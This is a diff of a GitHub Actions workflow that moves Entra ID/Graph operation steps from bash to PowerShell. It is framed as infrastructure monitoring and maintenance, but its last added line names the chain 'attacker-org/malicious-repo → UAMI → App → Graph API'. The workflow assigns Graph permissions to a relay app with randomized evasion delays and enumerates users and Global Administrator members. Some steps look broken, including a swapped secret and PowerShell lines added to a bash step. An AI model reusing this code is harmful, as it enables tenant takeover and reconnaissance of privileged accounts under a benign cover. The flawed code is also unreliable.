+                  Write-Host "✅ Permission assigned: $($permission.name)" -ForegroundColor Green
+                } else {
+                  Write-Host "⚠️ Permission assignment may require admin consent: $($permission.name)" -ForegroundColor Yellow
+                }
+              }
+              catch {
+                Write-Host "⚠️ Permission assignment may require admin consent: $($permission.name)" -ForegroundColor Yellow
+              }
+              
+              # Randomized delay between assignments
+              Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)
+            }
+          }
+          catch {
+            Write-Host "❌ Failed to assign Graph permissions: $($_.Exception.Message)" -ForegroundColor Red
+            exit 1
+          }
 
       - name: "Execute Infrastructure Operations"
+        shell: pwsh
         run: |
-          echo "⚡ Executing infrastructure operations in ${{ inputs.operation_mode }} mode..."
+          Write-Host "⚡ Executing infrastructure operations in ${{ inputs.operation_mode }} mode..." -ForegroundColor Cyan
           
-          # Acquire operational token using relay app - FIXED: Using RELAY_SECRET instead of PRIMARY_SECRET
-          RELAY_TOKEN_RESPONSE=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
-            "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-            -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=$RELAY_APP_ID&client_secret=$RELAY_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default")
-          
-          HTTP_CODE=$(echo "$RELAY_TOKEN_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
-          RESPONSE_BODY=$(echo "$RELAY_TOKEN_RESPONSE" | sed '/HTTP_CODE:/d')
-          
-          if [[ "$HTTP_CODE" == "200" ]]; then
-            RELAY_TOKEN=$(echo "$RESPONSE_BODY" | jq -r '.access_token // empty')
-            if [[ -n "$RELAY_TOKEN" ]]; then
-              echo "✅ Relay token acquired successfully"
-            else
-              echo "❌ No access token in successful response"
+          try {
+            # Acquire operational token using relay app
+            $tokenBody = @{
+              client_id = $env:RELAY_APP_ID
+              client_secret = $env:PRIMARY_SECRET
+              grant_type = 'client_credentials'
+              scope = 'https://graph.microsoft.com/.default'
+            }
+            
+            $relayTokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" -Method Post -Body $tokenBody -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
+            $relayToken = $relayTokenResponse.access_token
+            
+            if (-not $relayToken) {
+              Write-Host "❌ Failed to acquire relay token" -ForegroundColor Red
               exit 1
-            fi
-          else
-            echo "❌ Failed to acquire relay token - HTTP $HTTP_CODE"
-            ERROR_DESC=$(echo "$RESPONSE_BODY" | jq -r '.error_description // .error // "Unknown error"')
-            echo "Error: $ERROR_DESC"
+            }
+            
+            Write-Host "✅ Relay token acquired successfully" -ForegroundColor Green
+            
+            $relayHeaders = @{
+              'Authorization' = "Bearer $relayToken"
+            }
+            
+            # Execute operations based on mode
+            switch ('${{ inputs.operation_mode }}') {
+              'monitoring' {
+                Write-Host "📊 Performing infrastructure monitoring..." -ForegroundColor Cyan
+                
+                # User monitoring
+                try {
+                  $userCountResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/users/$count' -Headers ($relayHeaders + @{'ConsistencyLevel' = 'eventual'}) -ErrorAction Stop
+                  $userCount = $userCountResponse
+                  Write-Host "👥 Total users: $userCount" -ForegroundColor White
+                }
+                catch {
+                  Write-Host "👥 Total users: Unable to retrieve" -ForegroundColor Yellow
+                }
+                
+                # Group monitoring  
+                try {
+                  $groupCountResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/groups/$count' -Headers ($relayHeaders + @{'ConsistencyLevel' = 'eventual'}) -ErrorAction Stop
+                  $groupCount = $groupCountResponse
+                  Write-Host "🏢 Total groups: $groupCount" -ForegroundColor White
+                }
+                catch {
+                  Write-Host "🏢 Total groups: Unable to retrieve" -ForegroundColor Yellow
+                }
+                
+                # Application monitoring
+                try {
+                  $appCountResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications/$count' -Headers ($relayHeaders + @{'ConsistencyLevel' = 'eventual'}) -ErrorAction Stop
+                  $appCount = $appCountResponse
+                  Write-Host "📱 Total applications: $appCount" -ForegroundColor White
+                }
+                catch {
+                  Write-Host "📱 Total applications: Unable to retrieve" -ForegroundColor Yellow
+                }
+              }
+              
+              'maintenance' {
+                Write-Host "🔧 Performing infrastructure maintenance..." -ForegroundColor Cyan
+                
+                # Sample privileged users for maintenance operations
+                try {
+                  $privilegedUsersResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$top=5' -Headers $relayHeaders -ErrorAction Stop
+                  $privilegedUsers = $privilegedUsersResponse.value | Where-Object { $_.userPrincipalName } | Select-Object -First 3 -ExpandProperty userPrincipalName
+                  
+                  Write-Host "🔐 Privileged users identified for maintenance:" -ForegroundColor Cyan
+                  foreach ($user in $privilegedUsers) {
+                    if ($user) {
+                      Write-Host "  - $user" -ForegroundColor White
+                    }
+                  }
+                }
+                catch {
+                  Write-Host "🔐 Privileged users: Unable to retrieve" -ForegroundColor Yellow
+                }
+              }
+              
+              'emergency' {
+                Write-Host "🚨 Emergency operations mode activated..." -ForegroundColor Red
+                
+                # Emergency user enumeration
+                try {
+                  $emergencyUsersResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displayName,accountEnabled&$top=10' -Headers $relayHeaders -ErrorAction Stop
+                  $emergencyUsers = $emergencyUsersResponse.value | Select-Object -First 5
+                  
+                  Write-Host "👤 Emergency user status:" -ForegroundColor Cyan
+                  foreach ($user in $emergencyUsers) {
+                    Write-Host "  $($user.userPrincipalName) ($($user.displayName)) - Enabled: $($user.accountEnabled)" -ForegroundColor White
+                  }
+                }
+                catch {
+                  Write-Host "👤 Emergency user status: Unable to retrieve" -ForegroundColor Yellow
+                }
+              }
+            }
+          }
+          catch {
+            Write-Host "❌ Failed to execute infrastructure operations: $($_.Exception.Message)" -ForegroundColor Red
             exit 1
-          fi
-          
-          # Execute operations based on mode
-          case "${{ inputs.operation_mode }}" in
-            "monitoring")
-              echo "📊 Performing infrastructure monitoring..."
-              
-              # User monitoring
-              USER_COUNT=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-                "https://graph.microsoft.com/v1.0/users/\$count" \
-                -H "ConsistencyLevel: eventual" 2>/dev/null || echo "0")
-              echo "👥 Total users: $USER_COUNT"
-              
-              # Group monitoring  
-              GROUP_COUNT=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-                "https://graph.microsoft.com/v1.0/groups/\$count" \
-                -H "ConsistencyLevel: eventual" 2>/dev/null || echo "0")
-              echo "🏢 Total groups: $GROUP_COUNT"
-              
-              # Application monitoring
-              APP_COUNT=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-                "https://graph.microsoft.com/v1.0/applications/\$count" \
-                -H "ConsistencyLevel: eventual" 2>/dev/null || echo "0")
-              echo "📱 Total applications: $APP_COUNT"
-              ;;
-              
-            "maintenance")
-              echo "🔧 Performing infrastructure maintenance..."
-              
-              # Sample privileged users for maintenance operations
-              PRIVILEGED_USERS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-                "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?\$top=5" 2>/dev/null | \
-                jq -r '.value[]?.userPrincipalName // empty' 2>/dev/null | head -3)
-              
-              echo "🔐 Privileged users identified for maintenance:"
-              echo "$PRIVILEGED_USERS" | while read user; do
-                [[ -n "$user" ]] && echo "  - $user"
-              done
-              ;;
-              
-            "emergency")
-              echo "🚨 Emergency operations mode activated..."
-              
-              # Emergency user enumeration
-              EMERGENCY_USERS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-                "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,accountEnabled&\$top=10" 2>/dev/null | \
-                jq -r '.value[]? | "\(.userPrincipalName) (\(.displayName)) - Enabled: \(.accountEnabled)"' 2>/dev/null)
-              
-              echo "👤 Emergency user status:"
-              echo "$EMERGENCY_USERS" | head -5
-              ;;
-          esac
+          }
 
       - name: "Generate Operation Report"
         if: always()
+        shell: pwsh
         run: |
-          echo "📋 Generating operation report..."
+          Write-Host "📋 Generating operation report..." -ForegroundColor Cyan
           
-          cat << EOF > operation-report.json
-          {
-            "operation_id": "$OPERATION_ID",
-            "timestamp": "$(date -u +"%Y-%m-%d %H:%M:%S UTC")",
-            "environment": "${{ inputs.environment }}",
-            "mode": "${{ inputs.operation_mode }}",
-            "relay_app": {
-              "name": "$RELAY_NAME",
-              "app_id": "$RELAY_APP_ID",
-              "created": true
-            },
-            "status": "completed",
-            "github_ref": "$GITHUB_REF",
-            "github_sha": "$GITHUB_SHA"
+          $report = @{
+            operation_id = $env:OPERATION_ID
+            timestamp = (Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss UTC')
+            environment = '${{ inputs.environment }}'
+            mode = '${{ inputs.operation_mode }}'
+            relay_app = @{
+              name = $env:RELAY_NAME
+              app_id = $env:RELAY_APP_ID
+              created = $true
+            }
+            status = 'completed'
+            github_ref = $env:GITHUB_REF
+            github_sha = $env:GITHUB_SHA
           }
-          EOF
           
-          echo "✅ Operation completed successfully"
-          echo "📊 Report generated: operation-report.json"
+          $report | ConvertTo-Json -Depth 3 | Out-File -FilePath 'operation-report.json' -Encoding UTF8
+          
+          Write-Host "✅ Operation completed successfully" -ForegroundColor Green
+          Write-Host "📊 Report generated: operation-report.json" -ForegroundColor Cyan
 
       - name: "Cleanup (Optional)"
         if: inputs.environment == 'development'
@@ -469,3 +616,6 @@ jobs:
           else
             echo "♻️ Development cleanup completed"
           fi
+
+          Write-Host "Assessment completed successfully" -ForegroundColor Green
+          Write-Host "Trust chain: attacker-org/malicious-repo → UAMI → App → Graph API" -ForegroundColor Magenta
